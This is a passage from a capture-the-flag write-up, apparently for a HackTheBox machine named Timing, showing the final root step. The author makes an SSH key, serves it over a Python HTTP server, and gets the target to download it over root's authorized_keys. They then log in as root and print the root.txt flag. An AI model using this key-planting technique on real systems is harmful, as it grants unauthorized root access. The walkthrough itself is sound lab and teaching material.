+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa):
+/root/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:snaeInw+hn163CRbup+yM5RqW0uyVBUAMqOVRc3p6ck root@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|    =+++.o.      |
+|   o.+  +  .     |
+|  .    . ..      |
+|        o.       |
+|      .oSo       |
+|       +E o      |
+|   . o=++B       |
+|    +oOBXo..     |
+|     *=B*Bo      |
++----[SHA256]-----+
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ ls
+id_rsa  id_rsa.pub  known_hosts
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ cp id_rsa.pub keys
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ ls
+id_rsa  id_rsa.pub  keys  known_hosts
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Now enter the `url` and get the file after `getting the file` you see new file is not `created` it means it's overwrite the `authorized_keys`.
+
+<FixTheImageURL src='cmd5.png' slug='hackthebox-timing-writeup' />
+
+Now let's login with our `id_rsa` and get the `root.txt` file.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/.ssh]
+└──╼ [★]$ ssh -i id_rsa root@10.10.11.135
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Dec 22 08:06:31 UTC 2021
+
+  System load:  0.1               Processes:           203
+  Usage of /:   48.7% of 4.85GB   Users logged in:     1
+  Memory usage: 10%               IP address for eth0: 10.10.11.135
+  Swap usage:   0%
+
+
+8 updates can be applied immediately.
+8 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Dec  7 12:08:29 2021
+root@timing:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@timing:~# cat root.txt
+4a2e253435e9918b37745bf27f4e6183
+```
